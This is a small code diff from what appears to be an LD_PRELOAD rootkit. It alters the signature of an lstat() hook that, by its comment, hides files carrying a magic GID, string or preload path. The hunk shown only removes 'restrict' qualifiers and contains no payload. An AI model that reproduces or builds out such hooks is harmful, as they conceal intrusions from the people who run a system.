@@ -125,8 +125,8 @@ int __lxstat64(int version, const char *path, struct stat64 *buf) {
 /*
  * lstat() hook. Check for magic GID, STRING, and PRELOAD location and if set return an error.
 */
-int (*o_lstat)(const char *restrict, struct stat *restrict);
-int lstat(const char *restrict path, struct stat *restrict buf) {
+int (*o_lstat)(const char *, struct stat *);
+int lstat(const char * path, struct stat * buf) {
 
 	#ifdef DEBUG
 	fprintf(stderr, "lstat() called!\n");	
